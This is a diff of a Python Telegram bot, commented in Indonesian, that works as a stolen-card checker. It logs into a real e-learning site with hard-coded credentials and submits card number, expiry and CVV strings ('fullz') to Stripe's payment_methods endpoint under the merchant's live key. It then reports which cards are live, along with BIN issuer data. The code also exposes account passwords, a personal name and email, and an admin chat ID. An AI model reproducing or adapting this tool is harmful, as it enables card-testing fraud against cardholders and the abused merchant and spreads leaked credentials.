@@ -1,5 +1,4 @@
 import os
-import re
 import time
 import json
 import asyncio
@@ -15,10 +14,8 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# Ganti dengan chat ID kamu sendiri
-ADMIN_CHAT_ID = 7519839885
+ADMIN_CHAT_ID = 7519839885  # ID TELEGRAM
 
-# Helper function to extract substring between start and end
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -27,12 +24,10 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
-# Create payment method with expiry validation
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
-        # Validate expiration date
         mes = mes.zfill(2)
         if len(ano) == 4:
             ano = ano[-2:]
@@ -85,8 +80,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         data_login = {
             'learndash-login-form': login_token,
             'pmpro_login_form_used': '1',
-            'log': 'ayasayamaguchi12@signinid.com',   # Ganti akun login sesuai kamu
-            'pwd': 'Ayasa1209',               # Ganti password sesuai kamu
+            'log': 'ayasayamaguchi12@signinid.com',  # Ganti sesuai username kamu
+            'pwd': 'Ayasa1209',  # Ganti sesuai password kamu
             'wp-submit': 'Log In',
             'redirect_to': '',
         }
@@ -121,24 +116,24 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         }
 
         data_stripe = {
-            'type':'card',
-            'billing_details[name]':'parael senoman',
-            'billing_details[email]':'parael10@gmail.com',
+            'type': 'card',
+            'billing_details[name]': 'parael senoman',
+            'billing_details[email]': 'parael10@gmail.com',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
-            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
-            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
-            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
-            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
-            'referrer':'https://elearntsg.com',
-            'time_on_page':'146631',
-            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
-            'client_attribution_metadata[merchant_integration_source]':'elements',
-            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
-            'client_attribution_metadata[merchant_integration_version]':'2017',
-            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
+            'guid': '6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90f90',
+            'muid': '6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
+            'sid': '6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
+            'payment_user_agent': 'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
+            'referrer': 'https://elearntsg.com',
+            'time_on_page': '146631',
+            'client_attribution_metadata[client_session_id]': '026b4312-1f75-4cd9-a40c-456a8883e56c',
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
+            'client_attribution_metadata[merchant_integration_version]': '2017',
+            'key': 'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
         }
 
         response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
@@ -180,27 +175,28 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     except Exception as e:
         return f"Exception: {str(e)}"
 
-# Function to get bin info from binlist.net
+# Pakai API bin lookup dari drlabapis.onrender.com
 async def get_bin_info(bin_number: str) -> dict:
-    url = f"https://lookup.binlist.net/{bin_number}"
-    headers = {"Accept-Version": "3"}
+    url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number}"
     try:
         async with httpx.AsyncClient(timeout=10) as client:
-            resp = await client.get(url, headers=headers)
+            resp = await client.get(url)
             if resp.status_code == 200:
                 data = resp.json()
-                return {
-                    "type": data.get("type", "N/A"),
-                    "brand": data.get("brand", "N/A"),
-                    "issuer": data.get("bank", {}).get("name", "N/A"),
-                    "country": data.get("country", {}).get("name", "N/A"),
-                }
+                if data.get("status") == "ok":
+                    return {
+                        "type": data.get("type", "N/A"),
+                        "brand": data.get("tier", "N/A"),
+                        "issuer": data.get("issuer", "N/A"),
+                        "country": data.get("country", "N/A"),
+                    }
+                else:
+                    return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
             else:
                 return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
     except Exception:
         return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
 
-# Function maps API response text to friendly message
 async def charge_resp(result):
     try:
         if (
@@ -313,7 +309,6 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# Combines create_payment_method + charge_resp + measure time + binlist info
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -322,7 +317,6 @@ async def multi_checking(fullz: str) -> str:
 
     elapsed = round(time.time() - start, 2)
 
-    # Ambil bin (6 digit pertama)
     bin_number = fullz.split("|")[0][:6]
     bin_info = await get_bin_info(bin_number)
 
@@ -363,10 +357,6 @@ async def multi_checking(fullz: str) -> str:
 
     return output
 
-# Telegram bot handlers
-
-TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_chat.id != ADMIN_CHAT_ID:
         await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
@@ -402,7 +392,6 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # Optional sleep if you want to add delay (can be removed for speed)
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
@@ -413,7 +402,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         await update.message.reply_text(f"ERROR: {str(e)}")
 
 def main() -> None:
-    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+    application = ApplicationBuilder().token(os.getenv("TOKEN")).build()
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
@@ -423,4 +412,3 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
